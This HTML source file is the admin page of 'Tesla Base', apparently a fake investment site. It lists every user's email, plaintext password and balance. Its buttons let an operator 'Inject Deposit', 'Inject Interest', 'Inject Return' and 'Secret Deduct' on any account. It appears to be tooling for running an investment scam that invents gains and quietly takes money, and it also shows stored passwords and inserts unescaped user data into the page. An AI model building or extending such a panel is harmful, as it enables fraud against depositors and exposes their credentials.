<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tesla Base | Admin Management</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
</head>
<body style="background: #000; color: #fff; font-family: sans-serif; padding: 20px;">

    <h1>Master Admin Control</h1>
    <hr>

    <section id="user-management">
        <h3>Registered Users (Emails & Passwords)</h3>
        <table border="1" style="width:100%; text-align: left; background: #111; border-collapse: collapse;">
            <thead>
                <tr style="background: #222;">
                    <th style="padding: 10px;">Email</th>
                    <th style="padding: 10px;">Password</th>
                    <th style="padding: 10px;">Balance</th>
                    <th style="padding: 10px;">Action</th>
                </tr>
            </thead>
            <tbody id="user-list">
                </tbody>
        </table>
    </section>

    <hr style="margin: 30px 0;">

    <section id="inject-panel">
        <h3>Fund Management</h3>
        <input type="text" id="target-user" placeholder="User Email" style="padding: 10px; width: 250px;">
        <input type="number" id="inject-amount" placeholder="Amount ($)" style="padding: 10px; width: 150px;">
        <br><br>
        <button onclick="adminAction('deposit')" style="background: green; color: white; padding: 10px;">Inject Deposit</button>
        <button onclick="adminAction('interest')" style="background: blue; color: white; padding: 10px;">Inject Interest</button>
        <button onclick="adminAction('return')" style="background: purple; color: white; padding: 10px;">Inject Return</button>
        <button onclick="adminAction('deduct')" style="background: red; color: white; padding: 10px;">Secret Deduct</button>
    </section>

    <script src="app.js"></script>
    <script>
        async function loadAllUsers() {
            const { data, error } = await _supabase.from('profiles').select('*');
            if (error) return console.error(error);
            
            const container = document.getElementById('user-list');
            container.innerHTML = "";
            data.forEach(user => {
                container.innerHTML += `
                    <tr>
                        <td style="padding: 10px;">${user.email}</td>
                        <td style="padding: 10px;">${user.password}</td>
                        <td style="padding: 10px;">$${user.balance.toLocaleString()}</td>
                        <td style="padding: 10px;">
                            <button onclick="document.getElementById('target-user').value='${user.email}'">Select</button>
                        </td>
                    </tr>
                `;
            });
        }
        loadAllUsers();
    </script>
</body>
</html>
